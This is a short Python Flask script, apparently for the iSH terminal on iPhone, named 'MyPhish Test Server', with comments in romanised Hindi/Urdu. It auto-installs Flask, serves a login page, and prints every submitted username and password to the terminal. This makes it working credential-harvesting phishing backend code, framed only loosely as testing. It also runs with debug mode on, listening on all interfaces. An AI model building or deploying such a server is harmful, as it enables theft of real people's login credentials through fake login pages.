import os
import sys
import subprocess

# --- AUTO-INSTALLER SECTION ---
def check_and_install():
    print("[*] iSH Environment Check: Verifying dependencies...")
    try:
        import flask
        print("[+] All requirements are already satisfied!\n")
    except ImportError:
        print("[-] Required module 'Flask' missing. Auto-installing now...")
        try:
            # Pehle pip ke zariye install karne ki koshish karega
            subprocess.check_call([sys.executable, "-m", "pip", "install", "Flask"])
            print("[+] Flask successfully installed via pip!\n")
        except Exception:
            # Agar pip fail hota hai, toh iSH (Alpine) ka default package manager use karega
            print("[!] Pip failed. Trying Alpine 'apk' package manager...")
            os.system("apk update && apk add py3-flask")
            print("[+] Flask installed via apk!\n")

# Server start hone se pehle dependency check run hoga
check_and_install()
# ------------------------------

from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    # Ye templates/login.html ko load karega
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def capture_login():
    test_user = request.form.get('username')
    test_pass = request.form.get('password')
    
    print("\n" + "="*35)
    print("🚨 NEW TEST ATTEMPT CAPTURED 🚨")
    print(f"Username : {test_user}")
    print(f"Password : {test_pass}")
    print("="*35 + "\n")
    
    return "Testing Successful! Check your iSH terminal."

if __name__ == '__main__':
    print("[+] MyPhish Test Server Started!")
    print("[+] Open this link in your iPhone browser: http://127.0.0.1:5000")
    # iSH me local hosting ke liye 0.0.0.0 behtar kaam karta hai
    app.run(host='0.0.0.0', port=5000, debug=True)
